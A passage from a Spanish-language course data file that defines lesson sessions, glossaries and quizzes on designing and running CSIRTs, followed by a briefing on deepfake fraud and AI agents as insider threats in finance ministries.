                correct: "Correcto. Son 5 áreas y 21 servicios, y ningún CSIRT está obligado a ofrecerlos todos.",
                incorrect: "No exactamente. El framework define 5 áreas con 21 servicios asociados, elegidos según el mandato de cada equipo."
              }
            }
          }
        ]
      },
      {
        id: 'cert_s4',
        locked: true,
        title: "Sesión 4: Madurez Organizacional — SIM3 y el Marco de ENISA",
        content: [
          { type: 'text', icon: 'QuestionMarkCircleIcon', text: "Objetivo de la sesión: aplicar el modelo SIM3 (Security Incident Management Maturity Model) y el Marco de Madurez de ENISA para evaluar el nivel de madurez organizacional, humano, de herramientas y de procesos de un CSIRT." },
          { type: 'text', icon: 'ShieldCheckIcon', text: "SIM3, desarrollado por la Open CSIRT Foundation desde 2008, mide la madurez de un CSIRT en 4 pilares — Organización (gobernanza, mandato, autoridad legal), Humano (roles, competencias, capacitación), Herramientas (capacidades técnicas) y Procesos (procedimientos documentados) — calificando cada parámetro en una escala de 0 a 4." },
          { type: 'text', icon: 'ShieldCheckIcon', text: "ENISA adapta SIM3 en su Marco de Madurez de CSIRT con 3 niveles prácticos — Básico, Intermedio y Avanzado — alineados a los requisitos de la Directiva NIS/NIS2. La red CSIRTAmericas de la OEA usa una adaptación similar ('SIM3 CSIRTAmericas Baseline') para sus Estados miembro." },
          {
            type: 'interactive',
            title: 'Glosario: los 4 pilares de SIM3',
            items: [
              { term: 'Organización', definition: 'Gobernanza, mandato formal, autoridad legal y respaldo institucional del CSIRT.' },
              { term: 'Humano', definition: 'Roles definidos, competencias del equipo, planes de capacitación y gestión de conocimiento.' },
              { term: 'Herramientas', definition: 'Infraestructura técnica: sistemas de ticketing, sandboxing, inteligencia de amenazas, comunicación segura.' },
              { term: 'Procesos', definition: 'Procedimientos documentados y repetibles para cada servicio ofrecido (gestión de incidentes, de vulnerabilidades, etc.).' },
            ]
          },
          { type: 'text', icon: 'CalendarIcon', text: "Actividad presencial: usando una rúbrica SIM3 simplificada entregada por el docente, cada grupo autoevalúa (0-4) los 4 pilares de un CSIRT real o de un caso de estudio, identificando 2 brechas prioritarias y una acción concreta de mejora para cada una." },
          {
            type: 'h5p_check',
            title: 'Autoevaluación: madurez SIM3/ENISA',
            description: 'Comprueba tu comprensión del modelo de madurez antes de aplicarlo en el taller.',
            questions: [
              {
                question: '¿Cuáles son los 4 pilares del modelo SIM3?',
                options: [
                  { id: 's4q1_o1', text: 'Organización, Humano, Herramientas y Procesos.', isCorrect: true, score: 10 },
                  { id: 's4q1_o2', text: 'Presupuesto, Marketing, Ventas y Soporte.', isCorrect: false, score: 0 },
                  { id: 's4q1_o3', text: 'Prevención, Detección, Respuesta y Recuperación.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. Esos 4 pilares (a veces recordados como O-H-T-P) estructuran toda la evaluación SIM3.'
              },
              {
                question: 'En la escala SIM3, ¿qué rango se usa para calificar cada parámetro de madurez?',
                options: [
                  { id: 's4q2_o1', text: 'De 0 a 4.', isCorrect: true, score: 10 },
                  { id: 's4q2_o2', text: 'De 1 a 10.', isCorrect: false, score: 0 },
                  { id: 's4q2_o3', text: 'Aprobado / Reprobado (escala binaria).', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. Cada parámetro se califica de 0 (inexistente) a 4 (óptimo y auditado externamente).'
              },
              {
                question: '¿Qué nivel del Marco de Madurez de ENISA representa gobernanza sólida, herramientas avanzadas y mejora continua mediante auditorías externas?',
                options: [
                  { id: 's4q3_o1', text: 'Avanzado.', isCorrect: true, score: 10 },
                  { id: 's4q3_o2', text: 'Básico.', isCorrect: false, score: 0 },
                  { id: 's4q3_o3', text: 'Experimental.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. ENISA usa Básico / Intermedio / Avanzado como niveles prácticos derivados de SIM3.'
              }
            ]
          }
        ]
      },
      {
        id: 'cert_s5',
        locked: true,
        title: "Sesión 5: Gestión Operativa de Incidentes — NIST SP 800-61",
        content: [
          { type: 'text', icon: 'AlarmIcon', text: "Objetivo de la sesión: dominar el ciclo de vida de gestión de incidentes de NIST SP 800-61 (rev. 3) y aplicarlo en un ejercicio de simulación (tabletop) ante un incidente de ransomware." },
          { type: 'text', icon: 'BugIcon', text: "NIST SP 800-61 — el 'Computer Security Incident Handling Guide' — define un ciclo de 4 fases: Preparación; Detección y Análisis; Contención, Erradicación y Recuperación; y Actividad Post-Incidente. La revisión 3 alinea este ciclo con el NIST Cybersecurity Framework 2.0, integrando la gestión de incidentes en la gestión de riesgo de toda la organización." },
          { type: 'text', icon: 'BugIcon', text: "El triage — clasificar la severidad y prioridad de un incidente apenas se detecta — es la decisión más crítica de la fase de Detección y Análisis: de ella depende cuántos recursos se movilizan y qué tan rápido se escala a niveles directivos." },
          {
            type: 'interactive',
            title: 'Glosario: el ciclo NIST SP 800-61',
            items: [
              { term: 'Preparación', definition: 'Políticas, herramientas, capacitación y planes de comunicación listos antes de que ocurra un incidente.' },
              { term: 'Detección y Análisis', definition: 'Identificar señales de un posible incidente, confirmar su alcance y clasificar su severidad (triage).' },
              { term: 'Contención, Erradicación y Recuperación', definition: 'Detener la propagación, eliminar la causa raíz y restaurar los sistemas a un estado seguro conocido.' },
              { term: 'Actividad Post-Incidente', definition: 'Lecciones aprendidas, informe final y actualización de procedimientos para prevenir recurrencias.' },
            ]
          },
          { type: 'text', icon: 'CalendarIcon', text: "Actividad presencial: ejercicio de mesa (tabletop exercise) guiado por el docente sobre un incidente simulado de ransomware; el curso se divide en roles (líder de incidente, analista técnico, comunicaciones, enlace legal) y debe tomar decisiones en cada fase del ciclo NIST en tiempo limitado." },
          {
            type: 'quiz',
            quizData: {
              question: "En el ciclo de NIST SP 800-61, ¿en qué fase se clasifica la severidad de un posible incidente (triage)?",
              options: [
                "Preparación",
                "Detección y Análisis",
                "Actividad Post-Incidente"
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. El triage ocurre en la fase de Detección y Análisis, apenas se confirma una señal de incidente.",
                incorrect: "No exactamente. El triage es parte de la fase de Detección y Análisis, no de Preparación ni de la etapa post-incidente."
              }
            }
          }
        ]
      },
      {
        id: 'cert_s6',
        locked: true,
        title: "Sesión 6: Cooperación e Intercambio de Información",
        content: [
          { type: 'text', icon: 'ClosedEnvelopeIcon', text: "Objetivo de la sesión: aplicar el Traffic Light Protocol (TLP) para clasificar y compartir información sensible entre organizaciones, y reconocer las principales redes de confianza y mecanismos de divulgación coordinada de vulnerabilidades." },
          { type: 'text', icon: 'UserSearchIcon', text: "El TLP (Traffic Light Protocol), mantenido por FIRST, define niveles de sensibilidad para compartir información de ciberseguridad: TLP:RED (solo destinatarios directos), TLP:AMBER (limitado a la organización o un grupo específico), TLP:GREEN (comunidad amplia de confianza) y TLP:CLEAR (difusión sin restricciones)." },
          { type: 'text', icon: 'UserSearchIcon', text: "La cooperación entre CSIRT ocurre principalmente a través de redes de confianza: FIRST.org (global), Trusted Introducer/TF-CSIRT (Europa), CSIRTAmericas (OEA) y redes sectoriales como los ISAC (Information Sharing and Analysis Centers). La divulgación coordinada de vulnerabilidades es el proceso formal para reportar una falla a un fabricante y publicarla de forma responsable, dando tiempo a que se corrija antes de hacerla pública." },
          {
            type: 'interactive',
            title: 'Glosario: niveles del TLP',
            items: [
              { term: 'TLP:RED', definition: 'Uso exclusivo de los destinatarios directos de la reunión o el mensaje; no se redistribuye.' },
              { term: 'TLP:AMBER', definition: 'Compartible solo dentro de la organización del destinatario y con quienes necesiten conocerlo.' },
              { term: 'TLP:GREEN', definition: 'Compartible dentro de la comunidad de confianza del sector, pero no en canales públicos.' },
              { term: 'TLP:CLEAR', definition: 'Difusión pública sin restricciones (antes llamado TLP:WHITE).' },
            ]
          },
          { type: 'text', icon: 'CalendarIcon', text: "Actividad presencial: se entregan 6 reportes de incidentes simulados; cada grupo debe asignarles el nivel TLP correcto y simular su intercambio con un CSIRT 'par' de otro grupo, respetando las reglas de redistribución de cada nivel." },
          {
            type: 'flashcards',
            title: 'Redes de cooperación y organismos clave',
            cards: [
              { front: 'FIRST.org', back: 'Foro global que agrupa a cientos de CSIRT de más de 100 países; establece estándares como el CSIRT Services Framework y el TLP.' },
              { front: 'TF-CSIRT / Trusted Introducer', back: 'Red de coordinación y directorio de CSIRT acreditados en Europa.' },
              { front: 'CSIRTAmericas (OEA/CICTE)', back: 'Red que agrupa a los CSIRT nacionales de los Estados miembro de la Organización de los Estados Americanos.' },
              { front: 'ISAC (Information Sharing and Analysis Center)', back: 'Organización sectorial (financiero, salud, energía, etc.) dedicada a compartir inteligencia de amenazas entre sus miembros.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "¿Qué nivel de TLP se usa para información que puede difundirse públicamente sin restricciones?",
              options: [
                "TLP:RED",
                "TLP:AMBER",
                "TLP:CLEAR"
              ],
              correctOptionIndex: 2,
              feedback: {
                correct: "Correcto. TLP:CLEAR (antes TLP:WHITE) habilita la difusión pública sin restricciones.",
                incorrect: "No exactamente. TLP:RED y TLP:AMBER restringen la redistribución; TLP:CLEAR es el nivel de difusión abierta."
              }
            }
          }
        ]
      },
      {
        id: 'cert_s7',
        locked: true,
        title: "Sesión 7: Taller Aplicado — Diseño de un CSIRT",
        content: [
          { type: 'text', icon: 'ServerIcon', text: "Objetivo de la sesión: diseñar el anteproyecto de un CSIRT completo — mandato, constituencia, portafolio de servicios y nivel de madurez objetivo — tomando como referencia casos reales de CSIRT nacionales y sectoriales." },
          { type: 'text', icon: 'HappyUsersIcon', text: "CERT.br, operado por NIC.br (el registro de dominios de Brasil), es un caso frecuentemente citado de CSIRT con mandato nacional pero origen técnico-académico, con más de 25 años de trayectoria y fuerte enfoque en estadísticas públicas de incidentes. CERT-EU, en cambio, es el CSIRT de las instituciones, agencias y órganos de la propia Unión Europea, con un mandato institucional acotado a esa constituencia específica." },
          { type: 'text', icon: 'HappyUsersIcon', text: "Los elementos centrales al diseñar un CSIRT son: staffing (roles típicos: líder de equipo, analista de triage, especialista forense, enlace legal/comunicaciones), financiamiento y ubicación organizacional (¿reporta a TI, a riesgo o a la alta dirección?), y el conjunto mínimo de herramientas (sistema de gestión de casos, fuentes de inteligencia de amenazas, capacidad forense básica, canal seguro de comunicación)." },
          {
            type: 'interactive',
            title: 'Glosario: roles típicos de un CSIRT',
            items: [
              { term: 'Líder de equipo (Team Lead)', definition: 'Responsable de la coordinación operativa, las decisiones de escalamiento y la relación con la dirección.' },
              { term: 'Analista de Triage', definition: 'Primera línea que recibe y clasifica eventos, decidiendo su severidad y si se convierten en incidente.' },
              { term: 'Especialista Forense', definition: 'Analiza evidencia digital preservando la cadena de custodia para investigaciones más profundas.' },
              { term: 'Enlace Legal/Comunicaciones', definition: 'Gestiona los aspectos normativos, de reporte regulatorio y la comunicación con la constituencia y medios.' },
            ]
          },
          { type: 'text', icon: 'CalendarIcon', text: "Actividad presencial: cada grupo entrega el anteproyecto de diseño de un CSIRT (mandato + constituencia + hasta 3 servicios prioritarios del framework de FIRST + nivel de madurez SIM3 objetivo a 2 años) para el escenario que viene desarrollando desde la Sesión 3. Este anteproyecto es la base del proyecto final de la Sesión 8." },
          {
            type: 'h5p_check',
            title: 'Aplicación al diseño propio',
            description: 'Revisa los criterios clave antes de cerrar tu anteproyecto de CSIRT.',
            questions: [
              {
                question: '¿Qué determina principalmente qué servicios del FIRST CSIRT Services Framework debería priorizar un CSIRT nuevo?',
                options: [
                  { id: 's7q1_o1', text: 'Su mandato, su constituencia y los recursos disponibles.', isCorrect: true, score: 10 },
                  { id: 's7q1_o2', text: 'Copiar exactamente el portafolio de otro CSIRT reconocido.', isCorrect: false, score: 0 },
                  { id: 's7q1_o3', text: 'Ofrecer los 21 servicios desde el primer año.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. El portafolio se diseña a la medida del mandato, la constituencia y los recursos reales del equipo.'
              },
              {
                question: '¿Por qué es relevante decidir a quién reporta organizacionalmente el CSIRT (TI, riesgo o alta dirección)?',
                options: [
                  { id: 's7q2_o1', text: 'Porque determina su nivel de autoridad, independencia y velocidad de escalamiento ante decisiones críticas.', isCorrect: true, score: 10 },
                  { id: 's7q2_o2', text: 'Es una decisión puramente administrativa, sin impacto operativo.', isCorrect: false, score: 0 },
                  { id: 's7q2_o3', text: 'Solo afecta el diseño gráfico del sitio web del equipo.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. La ubicación organizacional afecta directamente la autoridad y la rapidez de respuesta del CSIRT.'
              }
            ]
          }
        ]
      },
      {
        id: 'cert_s8',
        locked: true,
        title: "Sesión 8: Integración, Evaluación y Proyecto Final",
        content: [
          { type: 'text', icon: 'CheckCircleIcon', text: "Objetivo de la sesión: integrar los 7 marcos trabajados durante el curso (terminología, RFC 2350, FIRST Services Framework, SIM3/ENISA, NIST SP 800-61, TLP y redes de cooperación) en la defensa del proyecto final: el diseño completo de un CSIRT." },
          { type: 'text', icon: 'PointerIcon', text: "Un diseño de CSIRT completo y defendible articula todos los marcos vistos: define su terminología y ubicación en el ecosistema global (Sesión 1), publica su RFC 2350 (Sesión 2), declara su portafolio de servicios según el framework de FIRST (Sesión 3), fija un nivel de madurez SIM3 objetivo (Sesión 4), documenta su proceso de gestión de incidentes según NIST SP 800-61 (Sesión 5), y define sus políticas de intercambio de información y cooperación regional (Sesiones 6-7)." },
          { type: 'text', icon: 'PointerIcon', text: "La evaluación final combina dos componentes: la defensa oral del proyecto ante el panel (docentes y compañeros) y una autoevaluación de madurez SIM3 del propio diseño, que obliga a los estudiantes a ser honestos sobre las brechas que su propio proyecto todavía no resuelve." },
          {
            type: 'interactive',
            title: 'Repaso: un marco por cada necesidad',
            items: [
              { term: 'RFC 2350', definition: 'El documento que declara el mandato, la constituencia y las políticas de un CSIRT.' },
              { term: 'FIRST CSIRT Services Framework', definition: 'El catálogo estándar de 5 áreas y 21 servicios que un CSIRT puede ofrecer.' },
              { term: 'SIM3 / ENISA', definition: 'El modelo que mide la madurez organizacional, humana, de herramientas y de procesos de un CSIRT.' },
              { term: 'NIST SP 800-61', definition: 'La guía que define el ciclo de vida de gestión de incidentes: preparación, detección/análisis, contención/erradicación/recuperación y post-incidente.' },
            ]
          },
          { type: 'text', icon: 'CalendarIcon', text: "Actividad presencial: defensa oral de 15 minutos por grupo del proyecto final (diseño completo de CSIRT), con retroalimentación cruzada de compañeros y una rúbrica de madurez SIM3 aplicada al propio proyecto como cierre del curso." },
          {
            type: 'memory',
            title: 'Asociar cada marco con lo que define',
            pairs: [
              { term: 'RFC 2350', definition: 'Qué es y a quién sirve un CSIRT (mandato y constituencia).' },
              { term: 'FIRST Services Framework', definition: 'Qué servicios ofrece un CSIRT, organizados en 5 áreas.' },
              { term: 'SIM3 / ENISA', definition: 'Qué tan maduro es un CSIRT en 4 pilares, en una escala de 0 a 4.' },
              { term: 'NIST SP 800-61', definition: 'Cómo gestiona un CSIRT el ciclo de vida operativo de un incidente.' },
            ]
          },
          {
            type: 'h5p_check',
            title: 'Evaluación Integral: Diseño y Gestión de CERTs/CSIRTs',
            description: 'Repaso final de los 7 marcos trabajados a lo largo del curso, previo a la defensa del proyecto.',
            questions: [
              {
                question: '¿Qué documento declara públicamente el mandato y la constituencia de un CSIRT?',
                options: [
                  { id: 's8q1_o1', text: 'RFC 2350.', isCorrect: true, score: 10 },
                  { id: 's8q1_o2', text: 'NIST SP 800-61.', isCorrect: false, score: 0 },
                  { id: 's8q1_o3', text: 'TLP:GREEN.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. El RFC 2350 es la plantilla estándar para el documento de expectativas de un CSIRT.'
              },
              {
                question: '¿Qué framework organiza el catálogo de servicios de un CSIRT en 5 áreas?',
                options: [
                  { id: 's8q2_o1', text: 'FIRST CSIRT Services Framework v2.1.', isCorrect: true, score: 10 },
                  { id: 's8q2_o2', text: 'SIM3.', isCorrect: false, score: 0 },
                  { id: 's8q2_o3', text: 'Convenio de Budapest.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. El framework de FIRST agrupa 21 servicios en 5 áreas.'
              },
              {
                question: '¿Qué modelo mide la madurez de un CSIRT en los pilares Organización, Humano, Herramientas y Procesos?',
                options: [
                  { id: 's8q3_o1', text: 'SIM3.', isCorrect: true, score: 10 },
                  { id: 's8q3_o2', text: 'TLP.', isCorrect: false, score: 0 },
                  { id: 's8q3_o3', text: 'RFC 2350.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. SIM3 (adoptado y adaptado por ENISA y por CSIRTAmericas) mide esos 4 pilares.'
              },
              {
                question: '¿Qué guía define el ciclo Preparación → Detección/Análisis → Contención/Erradicación/Recuperación → Post-Incidente?',
                options: [
                  { id: 's8q4_o1', text: 'NIST SP 800-61.', isCorrect: true, score: 10 },
                  { id: 's8q4_o2', text: 'FIRST CSIRT Services Framework.', isCorrect: false, score: 0 },
                  { id: 's8q4_o3', text: 'ENISA Maturity Framework.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. Ese es el ciclo de vida operativo de NIST SP 800-61.'
              },
              {
                question: '¿Qué protocolo se usa para clasificar cuán ampliamente puede redistribuirse un reporte de incidente?',
                options: [
                  { id: 's8q5_o1', text: 'TLP (Traffic Light Protocol).', isCorrect: true, score: 10 },
                  { id: 's8q5_o2', text: 'RFC 2350.', isCorrect: false, score: 0 },
                  { id: 's8q5_o3', text: 'NIS2.', isCorrect: false, score: 0 }
                ],
                feedback: '¡Excelente! Con esto cierras la síntesis de los 7 marcos del curso. Éxito en la defensa de tu proyecto final.'
              }
            ]
          }
        ]
      }
    ]
  },
  ia_ofensiva_insider: {
    title: "IA Ofensiva: El Nuevo Paradigma del Insider en Gobierno",
    description: "Briefing de 45 minutos —desarrollado por RedCiber.org y CERT Académico— sobre cómo la IA generativa y agéntica redefine la amenaza interna en Ministerios de Hacienda y Finanzas Públicas.",
    lastUpdated: "Septiembre 2026",
    modules: [
      {
        id: 'ia_ins_s1',
        title: "1. Encuadre: IA Ofensiva y el Nuevo Insider",
        content: [
          { type: 'text', icon: 'AlarmIcon', text: "Objetivo: entender por qué este tema ya está en la agenda de los Ministerios de Hacienda, y qué significa 'IA ofensiva' sin atarse a ningún proveedor comercial." },
          { type: 'text', icon: 'ServerIcon', text: "IA ofensiva: el uso de inteligencia artificial generativa o agéntica para ejecutar, escalar o automatizar fases de un ataque — ingeniería social, suplantación de identidad, generación de contenido fraudulento o manipulación de sistemas." },
          { type: 'text', icon: 'ServerIcon', text: "En julio de 2025, la OCDE y la Autoridad de Conducta del Sector Financiero de Sudáfrica copresidieron una Mesa Redonda del G20 sobre 'Inteligencia Artificial en las Finanzas', durante la reunión de Ministros de Finanzas y Bancos Centrales del G20: el tema ya se discute al más alto nivel." },
          {
            type: 'interactive',
            title: 'Glosario: primeros conceptos',
            items: [
              { term: 'IA ofensiva', definition: 'Uso de IA generativa o agéntica para ejecutar, escalar o automatizar ataques. No es un producto ni un proveedor: es un conjunto de capacidades cada vez más accesibles.' },
              { term: 'Insider Threat (amenaza interna)', definition: 'Persona de confianza, con acceso legítimo a sistemas, cuya acción intencional, negligente o accidental causa daño a la organización.' },
              { term: 'Deepfake', definition: 'Contenido de audio o video sintético, generado con IA, indistinguible a simple vista de una grabación real.' },
              { term: 'Agente de IA', definition: 'Sistema de IA con credenciales propias y capacidad de ejecutar acciones sobre otros sistemas, con distinto grado de autonomía.' },
            ]
          },
          { type: 'text', icon: 'CalendarIcon', text: "Nota de independencia: este contenido no promueve ni evalúa productos comerciales de IA. Es agnóstico de proveedor y de jurisdicción — los principios aplican a cualquier gobierno." },
          {
            type: 'quiz',
            quizData: {
              question: "¿Qué caracteriza a la 'IA ofensiva' según esta ruta?",
              options: [
                "Un producto específico de un fabricante de inteligencia artificial.",
                "Un conjunto de capacidades de IA generativa o agéntica usadas para ejecutar o escalar ataques.",
                "Una ley que regula el uso de inteligencia artificial en bancos centrales."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. Es un conjunto de capacidades, no un producto ni una ley — por eso el enfoque es agnóstico de proveedor.",
                incorrect: "No exactamente. La IA ofensiva se define por el uso —ejecutar o escalar ataques—, no por un producto o una norma específica."
              }
            }
          }
        ]
      },
      {
        id: 'ia_ins_s2',
        title: "2. El Nuevo Paradigma: Dos Vías hacia Ser Insider",
        content: [
          { type: 'text', icon: 'SpyIcon', text: "El modelo clásico de insider threat —formalizado por centros como el Insider Threat Center del SEI en Carnegie Mellon, la misma cuna del concepto 'CERT'— define al insider por tres elementos: persona de confianza, acceso legítimo, e intención o error." },
          { type: 'text', icon: 'SpyIcon', text: "Vía 1 — El impostor perfecto: un deepfake de voz o video explota la confianza jerárquica. El atacante no roba una credencial: roba una identidad completa, suficiente para superar la 'verificación' que muchas organizaciones usan hoy para autorizar transferencias." },
          { type: 'text', icon: 'BrainCircuitIcon', text: "Vía 2 — El insider no humano: un agente de IA con credenciales propias y acceso a sistemas financieros es, en la práctica, un empleado que nunca duerme, nunca cuestiona y puede ser manipulado. La guía CISA de amenaza interna (actualización 2026) ya incorpora esta 'dimensión de seguridad de IA'." },
          {
            type: 'interactive',
            title: 'Glosario: las dos vías',
            items: [
              { term: 'Vía 1 — Identidad sintética', definition: 'Un externo se hace pasar por un insider mediante voz/video clonados, explotando la confianza jerárquica.' },
              { term: 'Vía 2 — Agente con privilegios', definition: 'Un agente o copiloto de IA con acceso a sistemas se convierte, funcionalmente, en un nuevo tipo de insider no humano.' },
              { term: 'ASI03 (OWASP)', definition: 'Abuso de Identidad y Privilegios — la falla más reportada en encuestas empresariales de agentes de IA, 2025-2026.' },
              { term: 'Mínima agencia (Least Agency)', definition: 'Principio de OWASP: la autonomía de un agente de IA debe limitarse a lo estrictamente necesario para su tarea.' },
            ]
          },
          {
            type: 'flashcards',
            title: 'Elementos del Insider Threat clásico',
            cards: [
              { front: 'Persona de confianza', back: 'Acceso legítimo otorgado por la organización — el primer elemento del modelo clásico de insider threat.' },
              { front: 'Acceso a sistemas', back: 'Privilegios reales sobre información o procesos críticos.' },
              { front: 'Intención o error', back: 'Daño intencional, negligente o accidental — el tercer elemento del modelo clásico.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "¿Qué tienen en común las 'dos vías nuevas' hacia ser insider?",
              options: [
                "Ambas requieren robar físicamente una computadora de la organización.",
                "Ambas permiten cumplir los elementos del insider clásico (confianza, acceso, intención) sin ser, en el sentido tradicional, 'de la casa'.",
                "Ambas están reguladas exclusivamente por la Unión Europea."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. La identidad sintética y los agentes con privilegios son formas nuevas de cumplir el patrón clásico del insider sin ser personal interno tradicional.",
                incorrect: "No exactamente. Lo que comparten es que ambas vías cumplen el patrón del insider clásico —confianza, acceso, intención— sin ser 'de la casa' en el sentido tradicional."
              }
            }
          }
        ]
      },
      {
        id: 'ia_ins_s3',
        title: "3. Casos y Cifras: Cuando la Confianza es el Vector",
        content: [
          { type: 'text', icon: 'FishHookIcon', text: "Caso Arup (Hong Kong, enero 2024): un colaborador de finanzas recibió una videollamada de quien parecía ser el director financiero, junto a varios colegas, en tiempo real. Autorizó 15 transferencias por USD 25.6M. Cada persona en la llamada —excepto la víctima— era generada por IA." },
          { type: 'text', icon: 'ClosedEnvelopeIcon', text: "No hubo malware, ni phishing de correo, ni contraseña robada: el único punto de falla fue la confianza depositada en rostros y voces familiares. Patrones similares se reportaron en Singapur (2025), Europa y Norteamérica (2026), con cifras que varían según la fuente." },
          { type: 'text', icon: 'DocumentTextIcon', text: "La primera alerta oficial: FinCEN (Red de Control de Delitos Financieros de EE.UU.) emitió la Alerta FIN-2024-Alert004 el 13 de noviembre de 2024, sobre identidades sintéticas y suplantación de ejecutivos para autorizar transferencias fraudulentas." },
          {
            type: 'memory',
            title: 'Asociar caso o cifra con su detalle',
            pairs: [
              { term: 'Caso Arup', definition: 'USD 25.6M transferidos en 15 operaciones tras una videollamada con deepfakes, Hong Kong, enero 2024.' },
              { term: 'FIN-2024-Alert004', definition: 'Primera alerta oficial de EE.UU. sobre fraude con medios deepfake generados por IA (FinCEN, nov. 2024).' },
              { term: 'Punto de falla en Arup', definition: 'No hubo malware ni phishing: el único punto de falla fue la confianza en rostros y voces familiares.' },
              { term: 'Cifras del sector', definition: 'Reportadas por firmas de ciberseguridad y consultoría, no por una fuente gubernamental única — indicador de tendencia, no estadística oficial.' },
            ]
          },
          { type: 'text', icon: 'CalendarIcon', text: "Actividad presencial sugerida: pedir a los participantes identificar, en su propio proceso de autorización de transferencias, qué controles dependen hoy únicamente de un canal audiovisual." },
          {
            type: 'quiz',
            quizData: {
              question: "En el caso Arup, ¿cuál fue el único punto de falla real?",
              options: [
                "Un software malicioso instalado en la computadora del colaborador.",
                "La confianza depositada en rostros y voces familiares durante una videollamada.",
                "Una contraseña débil reutilizada en varios sistemas."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. No hubo malware ni contraseña robada: el ataque explotó exclusivamente la confianza en una identidad audiovisual convincente.",
                incorrect: "No exactamente. En Arup no hubo malware ni contraseña comprometida — el vector fue puramente la confianza en la videollamada."
              }
            }
          }
        ]
      },
      {
        id: 'ia_ins_s4',
        title: "4. El Terreno de Hacienda: Pagos, Impuestos y Adquisiciones",
        content: [
          { type: 'text', icon: 'ServerIcon', text: "Frente 1 — Pagos y tesorería: la autorización de transferencias de alto valor es exactamente el vector explotado en los casos vistos. Pregunta de diagnóstico: ¿existe un segundo canal, independiente del primero, obligatorio para toda transferencia de alto valor?" },
          { type: 'text', icon: 'DocumentTextIcon', text: "Frente 2 — Impuestos: la IA generativa escala la suplantación de autoridades tributarias. En EE.UU., el fraude fiscal identificado por investigaciones criminales del IRS creció +111% interanual (año fiscal 2025), alcanzando USD 10.59B en delitos financieros identificados." },
          { type: 'text', icon: 'ServerIcon', text: "Frente 3 — Adquisiciones y pagos indebidos: el gobierno federal de EE.UU. emitió USD 186B en pagos indebidos en el año fiscal 2025 — el universo de fraude que cadenas de aprobación automatizadas y agentes de IA mal gobernados pueden ampliar." },
          { type: 'text', icon: 'CheckCircleIcon', text: "La paradoja defensiva: la misma tecnología que ataca, defiende. El Departamento del Tesoro de EE.UU. previno y recuperó más de USD 4B en el año fiscal 2024 mediante detección de fraude con IA/ML. La diferencia no es la herramienta: es la gobernanza." },
          {
            type: 'interactive',
            title: 'Glosario: los tres frentes',
            items: [
              { term: 'Pagos y tesorería', definition: 'Autorización de transferencias de alto valor — el vector directo de los casos de deepfake vistos.' },
              { term: 'Impuestos', definition: 'Suplantación de autoridades tributarias para extraer datos personales y bancarios.' },
              { term: 'Adquisiciones', definition: 'Pagos indebidos y fraude de proveedores, potencialmente ampliados por automatización mal gobernada.' },
              { term: 'Paradoja defensiva', definition: 'La misma clase de IA que ataca también detecta fraude a gran escala cuando se gobierna con cuidado.' },
            ]
          },
          {
            type: 'h5p_check',
            title: 'Autoevaluación: el terreno de Hacienda',
            description: 'Comprueba tu comprensión de los tres frentes de exposición específicos de un Ministerio de Hacienda.',
            questions: [
              {
                question: '¿Cuál de los siguientes es el vector directo explotado por los casos de deepfake vistos en esta ruta?',
                options: [
                  { id: 'h1_o1', text: 'La autorización de transferencias de alto valor en tesorería.', isCorrect: true, score: 10 },
                  { id: 'h1_o2', text: 'La publicación de boletines de prensa del ministerio.', isCorrect: false, score: 0 },
                  { id: 'h1_o3', text: 'El diseño gráfico del sitio web institucional.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. La autorización de transferencias de alto valor es, exactamente, el vector explotado en los casos de deepfake analizados.'
              },
              {
                question: '¿Qué demuestra la cifra de USD 4B+ prevenidos/recuperados por el Tesoro de EE.UU.?',
                options: [
                  { id: 'h2_o1', text: 'Que la misma tecnología usada para atacar puede usarse para defender, con la gobernanza adecuada.', isCorrect: true, score: 10 },
                  { id: 'h2_o2', text: 'Que el fraude con IA ya fue completamente erradicado en el sector público.', isCorrect: false, score: 0 },
                  { id: 'h2_o3', text: 'Que solo un proveedor comercial específico puede prevenir este tipo de fraude.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. Es la "paradoja defensiva": la diferencia no es la herramienta, es la gobernanza y los controles de verificación humana.'
              }
            ]
          }
        ]
      },
      {
        id: 'ia_ins_s5',
        title: "5. Marcos Oficiales de Respuesta",
        content: [
          { type: 'text', icon: 'ShieldCheckIcon', text: "Este problema ya está en la agenda de gobierno: seis referencias oficiales e internacionales lo enmarcan, ninguna atada a un proveedor de tecnología específico." },
          { type: 'text', icon: 'ShieldCheckIcon', text: "CISA (EE.UU.) actualizó en 2026 su Guía de Mitigación de Amenaza Interna con una nueva 'dimensión de seguridad de IA'. NIST mantiene el AI Risk Management Framework y el Perfil de IA Generativa (AI 600-1). Seis agencias de ciberseguridad nacionales (CISA/NSA + Australia, Canadá, Nueva Zelanda y Reino Unido) publicaron en mayo de 2026 'Careful Adoption of Agentic AI Services'." },
          { type: 'text', icon: 'DocumentTextIcon', text: "MITRE ATLAS (v5.1.0, nov. 2025) mapea 16 tácticas y 84 técnicas adversarias contra sistemas de IA. OWASP publicó en diciembre de 2025 su Top 10 para Aplicaciones Agénticas. La OCDE define gobernanza de IA en el sector público en tres pilares, con participación activa del G20 —incluyendo numerosos países de habla hispana." },
          {
            type: 'interactive',
            title: 'Glosario: seis marcos de referencia',
            items: [
              { term: 'CISA', definition: 'Agencia de Ciberseguridad e Infraestructura de EE.UU. — Guía de Mitigación de Amenaza Interna, actualización 2026.' },
              { term: 'NIST', definition: 'Instituto Nacional de Estándares y Tecnología de EE.UU. — AI Risk Management Framework y Perfil de IA Generativa.' },
              { term: 'Five Eyes', definition: 'CISA/NSA + Australia, Canadá, Nueva Zelanda y Reino Unido — guía conjunta sobre adopción de IA agéntica (mayo 2026).' },
